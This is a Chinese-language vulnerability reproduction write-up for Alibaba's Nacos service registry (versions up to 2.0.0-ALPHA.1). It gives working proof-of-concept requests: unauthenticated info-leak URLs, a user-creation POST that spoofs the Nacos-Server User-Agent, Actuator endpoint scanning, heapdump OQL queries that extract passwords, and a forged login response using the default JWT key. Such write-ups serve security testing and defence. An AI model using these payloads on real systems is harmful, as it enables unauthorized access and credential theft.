[TOC]

# 概述

[Nacos](https://nacos.io/zh-cn/docs/what-is-nacos.html)作为一个开源的工具，是阿里开源的 SpringCloud Alibaba 项目下的一项技术，是服务注册中心、分布式配置中心，主要功能有：

1. 服务发现，即服务注册中心，当每个服务实例启动之后，都主动向注册中心登记自己的地址信息，这样注册中心便拥有了所有服务实例的记录*；*
2. 配置管理，系统中所有配置的编辑、存储、分发、变更管理、历史版本管理、变更审计等所有与配置相关的活动。

# 环境搭建

Nacos作为一项开源的项目，直接在GitHub或者官网便可下载。[漏洞影响版本](https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1)：Nacos <= 2.0.0-ALPHA.1

## Linux

```bash
tar -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz
./startup.sh -m standalone
```

## windows

```cmd
E:\nacos\bin>startup.cmd -m standalone
```

浏览器访问http://your-ip:8848/nacos，默认账号密码nacos/nacos

# 漏洞复现

## 信息泄露

在未登录的情况下访问url，查看nacos默认安装后泄露的内网ip地址，poc：

```
http://ip:8848/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageS%20ize=10&keyword
```

在未登录的情况下访问url，查看nacos默认安装后泄露的用户列表，poc：

```
http://ip:8848/nacos/v1/auth/users/?pageNo=1&pageSize=9
```

## 任意用户创建

根据Nacos官方在github发布的issue所披露的，漏洞主要由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。

访问http://your-ip:8848/nacos/v1/auth/users。利用POST传参，此处的参数为username=test&password=test，修改User-Agent头为Nacos-Server。发送POST请求，返回码200，成功创建test用户，poc：

```
POST /nacos/v1/auth/users HTTP/1.1
Host: ip:8848
User-Agent: Nacos-Server
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=test&password=test
```

test用户成功登录，可以看到有配置管理以及服务管理两个重要功能，因此，但攻击者可以任意进去后便可获得系统下的服务信息，进而进行更多的利用，包括一些数据库服务以及druid的监控服务等。

## 使用Spring Boot获得账号及密码

任意用户创建在Nacos <= 2.0.0-ALPHA.1大部分都被修复了，因此漏洞一的方法无法继续使用，但由于部分nacos在sping boot框架下搭建的，导致由于spring boot本身带有的信息泄露漏洞导致。

springboot 框架下拥有一个Actuator ，用来提供对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，其中`Spring Boot 1.x`版本默认在`Url根目录`下，`Spring Boot 2.x`版本端点移动到`/actuator/`路径。

Actuator默认带有的接口有：

| 路径                | 描述                                                         |
| ------------------- | ------------------------------------------------------------ |
| /autoconfig         | 提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过。 |
| /configprops        | 描述配置属性（包含默认值）如何注入 Bean。                    |
| /beans              | 描述应用程序上下文里全部的  Bean，以及它们的关系。           |
| /dump               | 获取线程活动的快照。                                         |
| /env                | 获取全部环境属性。                                           |
| /health             | 报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供。 |
| /info               | 获取应用程序的定制信息，这些信息由 info 打头的属性提供。     |
| /mappings           | 描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系。 |
| /metrics            | 报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数。     |
| /shutdown           | 关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）。 |
| /trace（httptrace） | 提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）。          |
| /heapdump           | heap dump内存溢出生成的文件，记录内存信息。                  |

在无法直接使用未授权漏洞去登入情况下，通过目录扫描发现存在大量未授权接口：

```cmd
F:\dirsearch-master>python dirsearch.py -u http://192.168.20.1:8848 -r

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903
Output File: F:\dirsearch-master\reports\192.168.20.1\_22-02-09_18-01-51.txt
Error Log: F:\dirsearch-master\logs\errors-22-02-09_18-01-51.log
Target: http://192.168.20.1:8848/
[18:01:51] Starting: 
[18:01:51] 302 -    0B  - /nacos  ->  http://192.168.20.1:8848/nacos/     (Added to queue)       
[18:02:27] Starting: nacos/                               
[18:02:41] 200 -    2KB - /nacos/actuator
[18:02:41] 200 -  198B  - /nacos/actuator/auditevents
[18:02:41] 200 -  157KB - /nacos/actuator/beans
[18:02:41] 200 -   20B  - /nacos/actuator/caches
[18:02:41] 200 -  100KB - /nacos/actuator/conditions
[18:02:41] 200 -    8KB - /nacos/actuator/configprops
[18:02:41] 200 -   22KB - /nacos/actuator/env
[18:02:41] 200 -   15B  - /nacos/actuator/health
[18:02:41] 200 -    2B  - /nacos/actuator/info
[18:02:42] 200 -   50KB - /nacos/actuator/httptrace
[18:02:42] 200 -  102KB - /nacos/actuator/mappings                         
[18:02:42] 200 - 1012B  - /nacos/actuator/metrics
[18:02:42] 200 -  701B  - /nacos/actuator/scheduledtasks
[18:02:42] 200 -   92KB - /nacos/actuator/loggers
[18:02:43] 200 -  565KB - /nacos/actuator/threaddump           
[18:02:43] 200 -   25KB - /nacos/actuator/prometheus
[18:02:47] 200 -   98MB - /nacos/actuator/heapdump                                                   
[18:03:02] 200 -  946B  - /nacos/favicon.ico                         
[18:03:03] 200 -    3KB - /nacos/index.html                                                           
[18:03:06] 200 -    1KB - /nacos/login.html                      
                                                          
Task Completed
```

这些接口存在大量敏感信息，可以从中直接获取到服务器的环境变量，内网ip，Web请求的详细信息，包括请求方法、路径、时间戳以及请求和响应的头信息甚至cookie信息

### 关键信息

- /env接口：会生成应用程序可用的所有环境属性的列表，无论这些属性是否用到。这其中包括环境变量、JVM 属性、命令行参数，以及 application.properties 或 application.yml 文件提供的属性。
- /heapdump接口：当访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret、key等)的属性名对应的属性值用 * 号替换达到脱敏的效果。而此时若是想要找到想要获取的被星号 * 遮掩的属性值对应的属性名可以通过下载heapdump 文件从其中获取信息。

其中heapdump是系统自动生成一个 Jvm 的堆文件，该文件保存了某一时刻JVM堆中对象使用情况，也可能包含着一些密码属性，通过对该文件进行解读可以从获取到nacos的密码。使用[MemoryAnalyzer](http://www.eclipse.org/mat/downloads.php)内存查看工具

![](F:\file\知识\1-广东技术分享\2021年11月\图片1.png)

此处可以执行OQL语句，有点类似SQL语句，执行以下OQL语句获得密码。

```
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))
```

![](F:\file\知识\1-广东技术分享\2021年11月\图片2.png)

利用Spring Boot也同样可以获取其他密码，如下图是另一个nacos的env接口，通过该接口可以看到此nacos监控了“SQL监控服务”

![](F:\file\知识\1-广东技术分享\2021年11月\图片3.png)

利用heapdump获取该脱敏数据，执行语句：`select * from org.springframework.web.context.support.StandardServletEnvironment`

![](F:\file\知识\1-广东技术分享\2021年11月\图片4.png)

## 后台未授权登录                                                

根据Nacos官方在github发布的[issue](https://github.com/alibaba/nacos/issues/7182)所披露的。漏洞主要由于NACOS使用了默认的JWT key导致的未授权访问漏洞。通过该漏洞，攻击者可以绕过用户名和密码验证直接登录到nacos用户后台。

访问http://192.168.20.1:8848/nacos/index.html。输入任意账号和密码，用bp抓取登录的数据包，拦截返回包。

![图片](https://user-images.githubusercontent.com/55682875/140475444-6270417c-e0ea-48ce-9d7a-981b3d87063e.png)

点击forward，返回包为

```
HTTP/1.1 403 
Content-Type: application/json;charset=UTF-8
Content-Length: 13
Date: Wed, 09 Feb 2022 11:08:26 GMT
Connection: close

unknown user!
```

修改response。forward后，浏览器已经成功登录nacos用户，poc：

```
HTTP/1.1 200
Server: nginx/1.19.6
Date: Sun, 11 Apr 2021 01:48:17 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: http://47.93.46.78:9090
Access-Control-Allow-Credentials: true
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA
Content-Length: 162

{"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA","tokenTtl":18000,"globalAdmin":true}
```



